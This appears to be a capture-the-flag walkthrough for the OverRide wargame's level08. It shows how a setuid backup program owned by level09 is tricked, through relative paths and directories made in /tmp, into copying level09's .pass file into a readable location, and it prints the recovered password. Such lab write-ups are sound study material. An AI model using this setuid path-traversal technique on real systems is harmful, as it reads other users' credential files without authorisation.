# Level08

## Walkthrough

We list the files in the current home directory.

```bash
level08@OverRide:~$ ls -lA
total 28
-r--------  1 level08 level08     0 Oct 19  2016 .bash_history
-rw-r--r--  1 level08 level08   220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root    root        7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level08 level08  3533 Sep 10  2016 .bashrc
-rw-r-xr--+ 1 level08 level08    41 Oct 19  2016 .pass
-rw-r--r--  1 level08 level08   675 Sep 10  2016 .profile
-r--------  1 level08 level08  2235 Oct 19  2016 .viminfo
drwxrwx---+ 1 level09 users      60 Oct 19  2016 backups
-rwsr-s---+ 1 level09 users   12975 Oct 19  2016 level08
level08@OverRide:~$ file level08 
level08: setuid setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf8990336d0891364d2754de14a6cc793677b9122, not stripped
```

The file `level08` is owned by **level09**, is 64-bit, and has the setuid bit.

```
(gdb) info function
All defined functions:

Non-debugging symbols:
0x00000000004006c0  _init
0x00000000004006f0  strcpy
0x00000000004006f0  strcpy@plt
0x0000000000400700  write
0x0000000000400700  write@plt
0x0000000000400710  fclose
0x0000000000400710  fclose@plt
0x0000000000400720  __stack_chk_fail
0x0000000000400720  __stack_chk_fail@plt
0x0000000000400730  printf
0x0000000000400730  printf@plt
0x0000000000400740  snprintf
0x0000000000400740  snprintf@plt
0x0000000000400750  strncat
0x0000000000400750  strncat@plt
0x0000000000400760  fgetc
0x0000000000400760  fgetc@plt
0x0000000000400770  close
0x0000000000400770  close@plt
0x0000000000400780  strcspn
0x0000000000400780  strcspn@plt
0x0000000000400790  __libc_start_main
0x0000000000400790  __libc_start_main@plt
0x00000000004007a0  fprintf
0x00000000004007a0  fprintf@plt
0x00000000004007b0  open
0x00000000004007b0  open@plt
0x00000000004007c0  fopen
0x00000000004007c0  fopen@plt
0x00000000004007d0  exit
0x00000000004007d0  exit@plt
0x00000000004007e0  _start
0x000000000040080c  call_gmon_start
0x0000000000400830  __do_global_dtors_aux
0x00000000004008a0  frame_dummy
0x00000000004008c4  log_wrapper
0x00000000004009f0  main
0x0000000000400c60  __libc_csu_init
0x0000000000400cf0  __libc_csu_fini
0x0000000000400d00  __do_global_ctors_aux
0x0000000000400d38  _fini
```

There are 2 user-defined functions: `main()` and `log_wrapper()`.

We download the executable and upload it on **Dogbolt** in order to understand the logic of the program.

[Link to the decompiled executable](https://dogbolt.org/?id=fb42ad07-6308-45df-b8f7-fe3953c56ac1)

The program seems to read a file passed as `argv[1]` and creates a backup of it in the `backups` directory.  
As **level09** is the owner of the executable, we may be able to open its `.pass` file.

We summarize the most important steps of the `main()` function:
- calls `fopen()` to open the `./backups/log` in write mode
- calls `fopen()` with `argv[1]` in read mode
- concatenates the `./backups/` and `argv[1]` strings together and tries to open it later with `open()`, creating the file if it doesn't exist
- copies byte by byte the content of the `argv[1]` file to the newly created file

We run the executable passing `/home/users/level09/.pass` as first argument.

```bash
level08@OverRide:~$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
level08@OverRide:~$ ls -lA backups/
total 4
-rwxrwx---+ 1 level09 users 49 May 13 23:38 .log
level08@OverRide:~$ cat backups/.log 
LOG: Starting back up: /home/users/level09/.pass
```

When we pass `/home/users/level09/.pass` to the executable, it is able to open the `.pass` file but the concatenated string is equal to `./backups//home/users/level09/.pass` which is not a valid filename because of the double slashes `//`.  
We might counter this problem using a relative path.

```bash
level08@OverRide:~$ ./level08 ../level09/.pass
ERROR: Failed to open ./backups/../level09/.pass
```

The program returns an error because we don't have the required permissions to create a new directory or file in `/home/users/level08`. The only directory we can modify is `/tmp`.

But there is no `./backups` directory in `/tmp`, so we have to create one.

```bash
level08@OverRide:~$ cd /tmp
level08@OverRide:/tmp$ mkdir backups
```

We try again, this time from the `/tmp` directory, and passing `../home/users/level09/.pass` as first argument.

```bash
level08@OverRide:/tmp$ ~/level08 ../home/users/level09/.pass
ERROR: Failed to open ./backups/../home/users/level09/.pass
```

So the `./backups` directory exists, the `../home/users/level09/.pass` exists, but `./backups/../home/users/level09/.pass` doesn't exist. The program fails because it tries to create a file to an invalid directory.  
But a simple solution exists: creating the `./home/users/level09` directories in `/tmp` in order to allow the program to create the `.pass` file inside it.

```bash
level08@OverRide:/tmp$ mkdir -p home/users/level09
level08@OverRide:/tmp$ ~/level08 ../home/users/level09/.pass
level08@OverRide:/tmp$ cat home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
